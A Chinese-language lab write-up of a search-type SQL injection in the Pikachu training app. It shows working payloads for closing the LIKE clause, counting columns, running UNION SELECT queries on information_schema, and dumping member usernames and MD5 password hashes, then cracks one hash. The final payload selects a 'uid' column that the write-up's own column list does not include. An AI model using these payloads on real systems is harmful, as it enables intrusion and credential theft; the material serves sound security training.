---
title: Pikachu 搜索型SQL注入 Writeup
date: 2026-10-29
category: Web安全
tags: [SQL注入, Pikachu, 搜索型注入]
---

## 漏洞原理

后端原始SQL语句猜想：
SELECT username,uid,email FROM member WHERE username LIKE '%$name%';
参数name由GET方式传入，直接拼接进SQL，没有过滤转义。
%在MySQL中是通配符，代表任意字符；输入可控内容可以用单引号闭合原有引号结构，破坏SQL语法，注入恶意语句。

## 注入步骤

1. 判断注入点

Payload：
'
结果：页面SQL语法报错，说明参数name存在注入漏洞。

2. 测试闭合、验证注入有效性

Payload：
%' or 1=1 #
拼接后SQL：
SELECT username,uid,email FROM member WHERE username LIKE '%' or 1=1 #%';
• %'：闭合前面的'%

• or 1=1：恒真条件，查询全部数据

• #：MySQL注释符，注释掉后面多余的%'
结果：页面返回所有用户数据，闭合成功。

3. order by 判断查询列数

Payload1：
%' order by 3 #
页面正常无报错。

Payload2：
%' order by 4 #
页面报错，列数不匹配。
结论：查询一共 3列。

4. 确认回显位置

Payload：
%' and 1=2 union select 1,2,3 #
and 1=2 使前面like查询结果为空，只展示union后的数据。
页面输出：
username:1
uid:2
email:3
回显位置：

• 第1列：username

• 第2列：uid

• 第3列：email

5. 查询当前数据库名

Payload：
%' and 1=2 union select database(),2,3 #
结果：数据库名 pikachu

6. 查询库中所有数据表

Payload：
%' and 1=2 union select group_concat(table_name),2,3 from information_schema.tables where table_schema=database() #
结果：httpinfo,member,message,users,xssblind
目标表：member（存储账号密码）

7. 查询member表内字段

Payload：
%' and 1=2 union select group_concat(column_name),2,3 from information_schema.columns where table_name='member' #
结果：id,username,pw,sex,phonenum,address,email
关键字段：username（用户名）、pw（MD5加密密码）

8. 脱库，查询账号与密码

Payload：
%' and 1=2 union select username,uid,pw from member #
返回结果：
用户名 uid MD5加密密码 
vince 1 e10adc3949ba59abbe56e057f20f883e 
allen 2 e10adc3949ba59abbe56e057f20f883e 
kobe 3 e10adc3949ba59abbe56e057f20f883e 
grady 4 e10adc3949ba59abbe56e057f20f883e 
kevin 5 e10adc3949ba59abbe56e057f20f883e 
lucy 6 e10adc3949ba59abbe56e057f20f883e 
lili 7 e10adc3949ba59abbe56e057f20f883e 

MD5密文 e10adc3949ba59abbe56e057f20f883e 解密结果：123456

## 漏洞危害

1. 攻击者利用该漏洞读取数据库内全部用户敏感信息，包括用户名、加密密码、联系方式、邮箱等；

2. 弱口令的MD5密文可以快速在线解密，直接获取明文密码；

3. 可进一步拓展攻击，读取服务器文件、提权控制服务器。

